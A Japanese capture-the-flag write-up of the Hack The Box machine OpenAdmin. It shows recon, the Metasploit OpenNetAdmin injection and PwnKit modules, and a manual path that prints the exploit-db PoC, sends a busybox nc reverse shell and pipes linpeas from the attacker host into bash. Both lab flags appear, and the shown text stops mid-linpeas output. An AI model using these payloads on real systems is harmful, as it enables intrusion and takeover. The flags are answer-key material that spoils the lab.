https://app.hackthebox.com/machines/OpenAdmin
## STEP 1
22番と80番がオープン
```sh
└─$ nmap -n -Pn --top-ports=1000 -sV -sC --max-retries=0 10.129.5.45                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 12:33 EDT
Warning: 10.129.5.45 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.129.5.45
Host is up (0.30s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
222/tcp   filtered rsh-spx
992/tcp   filtered telnets
1174/tcp  filtered fnet-remote-ui
1185/tcp  filtered catchpole
1247/tcp  filtered visionpyramid
1311/tcp  filtered rxmon
1501/tcp  filtered sas-3
1658/tcp  filtered sixnetudr
2040/tcp  filtered lam
4006/tcp  filtered pxc-spvr
6566/tcp  filtered sane-port
8651/tcp  filtered unknown
12000/tcp filtered cce4x
19801/tcp filtered unknown
32772/tcp filtered sometimes-rpc7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.73 seconds
```
脆弱性はなんもなさそう
```sh
└─$ nmap -n -Pn -p22,80 --script=vuln 10.129.5.45
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 12:34 EDT
Nmap scan report for 10.129.5.45
Host is up (0.32s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 42.29 seconds
```


## STEP 2
80番にアクセス、Apacheのデフォルトページっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_01.png" width="50%" height="50%">  
列挙していく、「music」「artwork」を発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.5.45/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.5.45/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4592ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4592ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4593ms]
artwork                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 283ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 304ms]
music                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 299ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 291ms]
:: Progress: [4744/4744] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
```
musicのログインページから、列挙で見つけれなかったサイトを発見  
サイト上でも確認できるように、OpenNetAdminというやつが使われているっぽい
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_02.png" width="75%" height="75%">  


# SOLUTION 1
USE METASPLOIT
## STEP 3
opennetadminにRCEが存在することを確認  
RCEを突いたリバースシェル取得、ただユーザフラグすら確認できない
```sh
msf6 > search opennetadmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/opennetadmin_ping_cmd_injection

msf6 > use 0
[*] Using configured payload linux/x86/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > options

Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /ona/login.php   yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOSTS 10.129.5.45
RHOSTS => 10.129.5.45

msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST tun0
LHOST => 10.10.14.70

msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set payload linux/x64/meterpreter/reverse_tcp 
payload => linux/x64/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run
[*] Started reverse TCP handler on 10.10.14.70:4444 
[*] Exploiting...
[*] Sending stage (3045380 bytes) to 10.129.5.45
[*] Meterpreter session 1 opened (10.10.14.70:4444 -> 10.129.5.45:58952) at 2025-04-30 14:25:47 -0400
[*] Command Stager progress - 100.00% done (809/809 bytes)

meterpreter > getuid
Server username: www-data

meterpreter > ls /home
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040750/rwxr-x---  4096  dir   2019-11-22 18:15:47 -0500  jimmy
040750/rwxr-x---  4096  dir   2021-07-27 02:12:06 -0400  joanna

meterpreter > ls /home/jimmy
[-] stdapi_fs_ls: Operation failed: 1

meterpreter > ls /home/joanna
[-] stdapi_fs_ls: Operation failed: 1
```


## STEP 4
`post/multi/recon/local_exploit_suggester`でEoPを探す
```sh
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.129.5.45 - Collecting local exploits for x64/linux...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.129.5.45 - 204 exploit checks are being tried...
[+] 10.129.5.45 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 10.129.5.45 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 10.129.5.45 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 10.129.5.45 - exploit/linux/local/docker_cgroup_escape: The target is vulnerable. IF host OS is Ubuntu, kernel version 4.15.0-70-generic is vulnerable
[+] 10.129.5.45 - exploit/linux/local/nested_namespace_idmap_limit_priv_esc: The target appears to be vulnerable.
[+] 10.129.5.45 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 10.129.5.45 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 10.129.5.45 - exploit/linux/local/su_login: The target appears to be vulnerable.
[*] Running check method for exploit 73 / 73
[*] 10.129.5.45 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 3   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 4   exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.15.0-70-generic is vulnerable
 5   exploit/linux/local/nested_namespace_idmap_limit_priv_esc           Yes                      The target appears to be vulnerable.
 6   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 7   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 9   exploit/linux/local/abrt_raceabrt_priv_esc                          No                       The target is not exploitable.
 10  exploit/linux/local/abrt_sosreport_priv_esc                         No                       The target is not exploitable.
 11  exploit/linux/local/af_packet_chocobo_root_priv_esc                 No                       The target is not exploitable. Linux kernel 4.15.0-70-generic #79-Ubuntu is not vulnerable
 12  exploit/linux/local/af_packet_packet_set_ring_priv_esc              No                       The target is not exploitable.
 13  exploit/linux/local/ansible_node_deployer                           No                       The target is not exploitable. Ansible does not seem to be installed, unable to find ansible executable
 14  exploit/linux/local/apport_abrt_chroot_priv_esc                     No                       The target is not exploitable.
 15  exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc          No                       The target is not exploitable.
 16  exploit/linux/local/bpf_priv_esc                                    No                       The target is not exploitable.
 17  exploit/linux/local/bpf_sign_extension_priv_esc                     No                       The target is not exploitable. Kernel version 4.15.0-70-generic is not vulnerable
 18  exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe       No                       Cannot reliably check exploitability. Unknown target kernel version, recommend manually checking if target kernel is vulnerable.
 19  exploit/linux/local/cve_2021_38648_omigod                           No                       The target is not exploitable. The omiserver process was not found.
 20  exploit/linux/local/cve_2022_0847_dirtypipe                         No                       The target is not exploitable. Linux kernel version 4.15.0 is not vulnerable
 21  exploit/linux/local/cve_2022_1043_io_uring_priv_esc                 No                       The target is not exploitable.
 22  exploit/linux/local/cve_2023_0386_overlayfs_priv_esc                No                       The target is not exploitable. Linux kernel version 4.15.0 is not vulnerable
 23  exploit/linux/local/desktop_privilege_escalation                    No                       The target is not exploitable.
 24  exploit/linux/local/diamorphine_rootkit_signal_priv_esc             No                       The target is not exploitable. Diamorphine is not installed, or incorrect signal '64'
 25  exploit/linux/local/docker_daemon_privilege_escalation              No                       The target is not exploitable.
 26  exploit/linux/local/docker_privileged_container_escape              No                       The target is not exploitable. Not inside a Docker container
 27  exploit/linux/local/exim4_deliver_message_priv_esc                  No                       The target is not exploitable.
 28  exploit/linux/local/gameoverlay_privesc                             No                       The target is not exploitable. Target does not appear to be running a vunerable Ubuntu Distro or Kernel
 29  exploit/linux/local/glibc_ld_audit_dso_load_priv_esc                No                       The target is not exploitable.
 30  exploit/linux/local/glibc_origin_expansion_priv_esc                 No                       The target is not exploitable. GNU C Library version 2.27 is not vulnerable
 31  exploit/linux/local/glibc_realpath_priv_esc                         No                       The target is not exploitable.
 32  exploit/linux/local/glibc_tunables_priv_esc                         No                       The target is not exploitable. The glibc version (2.27-3ubuntu1) found on the target does not appear to be vulnerable
 33  exploit/linux/local/hp_xglance_priv_esc                             No                       The target is not exploitable. /opt/perf/bin/xglance-bin file not found
 34  exploit/linux/local/juju_run_agent_priv_esc                         No                       The target is not exploitable.
 35  exploit/linux/local/ktsuss_suid_priv_esc                            No                       The target is not exploitable. /usr/bin/ktsuss file not found
 36  exploit/linux/local/lastore_daemon_dbus_priv_esc                    No                       The target is not exploitable.
 37  exploit/linux/local/libuser_roothelper_priv_esc                     No                       The target is not exploitable. /usr/sbin/userhelper file not found
 38  exploit/linux/local/netfilter_nft_set_elem_init_privesc             No                       The target is not exploitable.
 39  exploit/linux/local/netfilter_priv_esc_ipv4                         No                       The target is not exploitable.
 40  exploit/linux/local/netfilter_xtables_heap_oob_write_priv_esc       No                       The check raised an exception.
 41  exploit/linux/local/network_manager_vpnc_username_priv_esc          No                       The target is not exploitable.
 42  exploit/linux/local/ntfs3g_priv_esc                                 No                       The target is not exploitable.
 43  exploit/linux/local/omniresolve_suid_priv_esc                       No                       The target is not exploitable. /opt/omni/lbin/omniresolve file not found
 44  exploit/linux/local/overlayfs_priv_esc                              No                       The target is not exploitable.
 45  exploit/linux/local/progress_flowmon_sudo_privesc_2024              No                       The target is not exploitable.
 46  exploit/linux/local/progress_kemp_loadmaster_sudo_privesc_2024      No                       The target is not exploitable. Found 0 indicators this is a KEMP product
 47  exploit/linux/local/ptrace_sudo_token_priv_esc                      No                       The target is not exploitable.
 48  exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc  No                       The target is not exploitable. Linux kernel 4.15.0-70-generic #79-Ubuntu is not vulnerable
 49  exploit/linux/local/rds_rds_page_copy_user_priv_esc                 No                       The target is not exploitable. Linux kernel version 4.15.0-70-generic is not vulnerable
 50  exploit/linux/local/recvmmsg_priv_esc                               No                       The target is not exploitable.
 51  exploit/linux/local/reptile_rootkit_reptile_cmd_priv_esc            No                       The target is not exploitable.
 52  exploit/linux/local/runc_cwd_priv_esc                               No                       The target is not exploitable. The runc command was not found on this system
 53  exploit/linux/local/saltstack_salt_minion_deployer                  No                       The target is not exploitable. salt-master does not seem to be installed, unable to find salt-master executable
 54  exploit/linux/local/servu_ftp_server_prepareinstallation_priv_esc   No                       The target is not exploitable. /usr/local/Serv-U/Serv-U file not found
 55  exploit/linux/local/sudo_baron_samedit                              No                       Cannot reliably check exploitability. Could not identify the version of sudo.
 56  exploit/linux/local/sudoedit_bypass_priv_esc                        No                       The target is not exploitable. sudo version 1.9.7.pre.2 may NOT be vulnerable
 57  exploit/linux/local/systemtap_modprobe_options_priv_esc             No                       The target is not exploitable. /usr/bin/staprun file not found
 58  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                 No                       The check raised an exception.
 59  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                 No                       The target is not exploitable. Error processing Tomcat version (packages) into known format: Malformed version number string packages
 60  exploit/linux/local/ubuntu_enlightenment_mount_priv_esc             No                       The target is not exploitable. An exploitable enlightenment_sys was not found on the system
 61  exploit/linux/local/ubuntu_needrestart_lpe                          No                       The target is not exploitable. needrestart binary not found
 62  exploit/linux/local/ufo_privilege_escalation                        No                       The target is not exploitable.
 63  exploit/linux/local/vcenter_java_wrapper_vmon_priv_esc              No                       The target is not exploitable. /usr/lib/vmware-vmon/java-wrapper-vmon not found on system
 64  exploit/linux/local/vcenter_sudo_lpe                                No                       The target is not exploitable. Unable to determine vcenter build from output:
 65  exploit/linux/local/vmware_alsa_config                              No                       The target is not exploitable.
 66  exploit/linux/local/vmware_workspace_one_access_certproxy_lpe       No                       The target is not exploitable. Not running as the horizon user.
 67  exploit/linux/local/vmware_workspace_one_access_cve_2022_22960      No                       The target is not exploitable. Not running as the horizon user.
 68  exploit/linux/local/vmwgfx_fd_priv_esc                              No                       The target is not exploitable. Unable to write to /dev/dri/card0 or /dev/dri/renderD128
 69  exploit/linux/local/zimbra_postfix_priv_esc                         No                       The target is not exploitable.
 70  exploit/linux/local/zimbra_slapper_priv_esc                         No                       The target is not exploitable.
 71  exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc          No                       The target is not exploitable. Directory '/opt/sysinfo' does not exist
 72  exploit/multi/local/xorg_x11_suid_server                            No                       The target is not exploitable.
 73  exploit/multi/local/xorg_x11_suid_server_modulepath                 No                       The target is not exploitable.
```
`exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec`で権限昇格成功！
```sh
msf6 > sessions

Active sessions
===============

  Id  Name  Type                   Information             Connection
  --  ----  ----                   -----------             ----------
  1         meterpreter x64/linux  www-data @ 10.129.5.45  10.10.14.70:4444 -> 10.129.5.45:59984 (10.129.5.45)

msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > options

Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PKEXEC_PATH                    no        The path to pkexec binary
   SESSION                        yes       The session to run this module on
   WRITABLE_DIR  /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.142.100   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   x86_64



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
SESSION => 1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST tun0
LHOST => 10.10.14.70

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
[*] Started reverse TCP handler on 10.10.14.70:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.enazymdghwwb
[+] The target is vulnerable.
[*] Writing '/tmp/.frdvvvnizl/dljqkkvnu/dljqkkvnu.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.frdvvvnizl
[*] Sending stage (3045380 bytes) to 10.129.5.45
[*] Meterpreter session 2 opened (10.10.14.70:4444 -> 10.129.5.45:60012) at 2025-04-30 15:23:56 -0400
[+] Deleted /tmp/.frdvvvnizl/dljqkkvnu/dljqkkvnu.so
[+] Deleted /tmp/.frdvvvnizl/.dtrpoqkdtc
[+] Deleted /tmp/.frdvvvnizl
[*] Meterpreter session 4 opened (10.10.14.70:4444 -> 10.129.5.45:60112) at 2025-04-30 15:24:01 -0400

meterpreter > getuid
Server username: root

meterpreter > search -f user.txt
Found 1 result...
=================

Path                   Size (bytes)  Modified (UTC)
----                   ------------  --------------
/home/joanna/user.txt  33            2025-04-30 12:32:10 -0400

meterpreter > cat /home/joanna/user.txt
c10959fe2109c8c441260310209bb327

meterpreter > search -f root.txt
Found 1 result...
=================

Path            Size (bytes)  Modified (UTC)
----            ------------  --------------
/root/root.txt  33            2025-04-30 12:32:10 -0400

meterpreter > cat /root/root.txt
04a4b3183f9b2e2ab0d411a2b75f34c6
```



# SOLUTION 2
NO METASPLOIT
## STEP 3
searchsploitで、OpenNetAdmin 18.1.1 のPoCを発見
```sh
└─$ searchsploit opennetadmin
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                                                                             | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                                                                              | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                                                                               | php/webapps/47691.sh
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


└─$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/htb/47691.sh
```
PoCの使い方はURLを引数にする必要あり  
ただリバースシェルをとるのではなく毎度コマンドをRCEで実行しているぽいので、リバースシェルをとる必要あり
```sh
└─$ cat 47691.sh                                                   
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done


└─$ ./47691.sh http://10.129.5.45/ona/login.php
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
busyboxのncをRCEで実行
```sh
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";busybox nc 10.10.14.70 4444 -e /bin/bash;echo \"END\"&xajaxargs[]=ping" http://10.129.5.45/ona/login.php 
^C
```
無事リバースシェル取得
```sh
└─$ rlwrap nc -lnvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.5.45] 32810

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

tty
not a tty

python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$

www-data@openadmin:/opt/ona/www$ tty
tty
/dev/pts/1
```


## STEP 4
`linpeas.sh`でEoPを探す
```sh
└─$ cp /usr/share/peass/linpeas/linpeas.sh .                                                                                                                                                                                     
                                                                                                                                                                                                                                            

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
www-data@openadmin:/opt/ona/www$ curl http://10.10.14.70/linpeas.sh | bash
curl http://10.10.14.70/linpeas.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄                                                                                                                                                                                 
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-70-generic (buildd@lgw01-amd64-055) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: openadmin

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            

 32  820k   32  269k    0     0  35080      0  0:00:23  0:00:07  0:00:16 35076uniq: write error: Broken pipe. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
uniq: write error: Broken pipe
DONE
                                                                                                                                                                                                                                            
 45  820k   45  369k    0     0  43113      0  0:00:19  0:00:08  0:00:11 43108                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                                                                           
Linux version 4.15.0-70-generic (buildd@lgw01-amd64-055) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019                                                                                    
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.3 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                                                                              
Sudo version 1.9.7p1                                                                                                                                                                                                                        


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                                                                      
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                                

╔══════════╣ Date & uptime
Thu May  1 08:28:59 UTC 2025                                                                                                                                                                                                                
 08:28:59 up 15:57,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
UUID=faf60c54-5ca1-43ac-a61b-b1ded42569f2 / ext4 defaults 0 0                                                                                                                                                                               
/dev/sda3       none    swap    sw      0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        
sda
sda1
sda2
sda3

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
APACHE_LOG_DIR=/var/log/apache2                                                                                                                                                                                                             
LANG=C
